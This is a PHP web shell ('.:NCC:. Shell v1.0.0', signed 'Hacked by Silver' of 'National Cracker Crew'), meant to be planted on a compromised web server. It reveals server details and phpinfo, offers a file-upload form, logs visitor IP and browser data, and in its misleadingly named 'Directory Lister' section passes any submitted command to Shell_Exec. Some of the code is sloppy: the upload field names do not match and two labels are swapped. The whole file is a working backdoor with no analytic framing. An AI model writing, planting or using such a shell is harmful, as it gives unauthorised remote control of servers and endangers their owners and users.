<center>
<h1>.:NCC:. Shell v1.0.0</h1>
<title>.:NCC:. Shell v1.0.0</title>
<head><h2>Hacked by Silver</h2></head>
<h1>---------------------------------------------------------------------------------------</h1><br>
<b><font color=red>---Server Info---</font></b><br>
<?php
echo "<b><font color=red>Safe Mode on/off:  </font></b>";
// Check for safe mode
if( ini_get('safe_mode') ) {
  print '<font color=#FF0000><b>Safe Mode ON</b></font>';
} else {
  print '<font color=#008000><b>Safe Mode OFF</b></font>';
}
echo "</br>";
echo "<b><font color=red>Momentane Directory:  </font></b>"; echo $_SERVER['DOCUMENT_ROOT'];
echo "</br>";
echo "<b><font color=red>Server: </font></b><br>"; echo $_SERVER['SERVER_SIGNATURE'];
echo "<a href='$php_self?p=info'>PHPinfo</a>";
if(@$_GET['p']=="info"){
@phpinfo();
exit;}
?>
<h1>---------------------------------------------------------------------------</h1><br>
<h2>- Upload -</h2>
<title>Upload - Shell/Datei</title>
<form
 action="<?php echo $_SERVER['PHP_SELF']; ?>"
 method="post"
 enctype="multipart/form-data">
<input type="file" name="Upload" />
<input type="submit" value="Upload!" />
</form>
<hr />
<?php

 if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {
   // Alternativ:            and   $_FILES['probe']['size']
   move_uploaded_file($_FILES['probe']['tmp_name'], "./dingen.php");
   printf("Die Datei %s wurde als dingen.php hochgeladen.<br />\n",
     $_FILES['probe']['name']);
   printf("Sie ist %u Bytes groß und vom Typ %s.<br />\n",
     $_FILES['probe']['size'], $_FILES['probe']['type']);
 }
?>
<h1>---------------------------------------------------------------------------</h1><br>
<h2>IpLogger</h2>
<?php
echo "<b><font color=red><br>IP: </font></b>"; echo $_SERVER['REMOTE_ADDR'];
echo "<b><font color=red><br>PORT: </font></b>"; echo $_SERVER['REMOTE_PORT'];
echo "<b><font color=red><br>BROWSER: </font></b>"; echo $_SERVER[HTTP_REFERER];
echo "<b><font color=red><br>REFERER: </font></b>"; echo $_SERVER['HTTP_USER_AGENT'];
?>
<h1>---------------------------------------------------------------------------</h1><br>
<h2>Directory Lister</h2>
<? $cmd = $_REQUEST["-cmd"];?><onLoad="document.forms[0].elements[-cmd].focus()"><form method=POST><br><input type=TEXT name="-cmd" size=64 value=<?=$cmd?>><hr><pre><?if($cmd != "") print Shell_Exec($cmd);?></pre></form><br>
<h1>---------------------------------------------------------------------------</h1><br>
<b>--Coded by Silver©--<br>
~|_Team .:National Cracker Crew:._|~<br>
<a href="http://www.n-c-c.6x.to" target="_blank">-->NCC<--</a></center></b></html>
